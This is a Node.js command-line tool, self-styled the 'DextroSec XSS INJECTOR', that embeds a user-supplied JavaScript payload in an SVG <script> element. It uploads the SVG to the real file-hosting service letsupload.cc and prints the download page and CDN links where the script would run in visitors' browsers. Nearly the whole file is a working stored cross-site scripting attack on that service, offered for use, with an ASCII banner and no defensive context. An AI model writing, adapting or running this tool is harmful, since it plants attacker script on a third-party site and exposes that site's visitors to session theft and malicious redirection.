const { Command } = require('commander');
const FormData = require('form-data');
const cheerio = require('cheerio')
const axios = require('axios');
const program = new Command();
const utf8 = require('utf8');
const fs = require('fs');

/*
______
\_____\
    \\
     \\  ,
     _,-'\
    '\    \
      \    \        DextroSec XSS INJECTOR
       \    \
        \_,-'\   Rewrote Boofsecs XSS for LetsUpload.cc In Nodejs
         \_,-'\
          \_,-'\
           \_,-'
              \\
               \\
                \\
                 \\
                  \|
*/

async function getcdn(urler){
const url = urler; 
axios.get(url)
  .then(response => {
    const html = response.data;
    const $ = cheerio.load(html);
    const downloadUrl = $('#download-url').attr('href');
    console.log("[+] CDN Url " + downloadUrl)
  })
  .catch(error => {
    console.log(error);
  });
}

module.exports = { getcdn }

async function upload(code) {
    const SVG = `<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        %code%
    </script>
</svg>
`;
    var jsCode = code;
    const svg = SVG.replace('%code%', jsCode);
    var tooka = utf8.encode(svg);

    const formData = new FormData();

    formData.append('file', tooka, {
        filename: `${Math.random().toString(36).slice(2, 7)}.svg`,
    });

    try {
        const {
            data
        } = await axios.post(
            `https://api.letsupload.cc/upload`,
            formData, {
                headers: {
                    ...formData.getHeaders(),
                },
            }
        );
        const url = data.data.file.url.full;
        console.log("[+] Dowonload page: " + url)
        await getcdn(url)

    } catch (err) {
        console.error(err);
        process.exit(1);
    }
}
var bannerrr = `                                                                                                        
@@@@@@@   @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@    @@@@@@    @@@@@@   @@@@@@@@   @@@@@@@     @@@  @@@   @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@     @@@  @@@  @@@@@@@   @@@@@@@   
@@!  @@@  @@!       @@!  !@@    @@!    @@!  @@@  @@!  @@@  !@@       @@!       !@@          @@!  !@@  !@@       !@@       
!@!  @!@  !@!       !@!  @!!    !@!    !@!  @!@  !@!  @!@  !@!       !@!       !@!          !@!  @!!  !@!       !@!       
@!@  !@!  @!!!:!     !@@!@!     @!!    @!@!!@!   @!@  !@!  !!@@!!    @!!!:!    !@!           !@@!@!   !!@@!!    !!@@!!    
!@!  !!!  !!!!!:      @!!!      !!!    !!@!@!    !@!  !!!   !!@!!!   !!!!!:    !!!            @!!!     !!@!!!    !!@!!!   
!!:  !!!  !!:        !: :!!     !!:    !!: :!!   !!:  !!!       !:!  !!:       :!!           !: :!!        !:!       !:!  
:!:  !:!  :!:       :!:  !:!    :!:    :!:  !:!  :!:  !:!      !:!   :!:       :!:          :!:  !:!      !:!       !:!   
 :::: ::   :: ::::   ::  :::     ::    ::   :::  ::::: ::  :::: ::    :: ::::   ::: :::      ::  :::  :::: ::   :::: ::   
:: :  :   : :: ::    :   ::      :      :   : :   : :  :   :: : :    : :: ::    :: :: :      :   ::   :: : :    :: : :    
                                    a simple xss for letsupload.cc                                                                                                   
`
program
    .version("1.0.0")
    .description(bannerrr)
    .option("-f, --file  [value]", "JS Payload Path")
    .parse(process.argv);

const options = program.opts();


if (options.file) {
    var selectedfile = fs.readFileSync(program.opts().file)
    upload(selectedfile.toString())
}
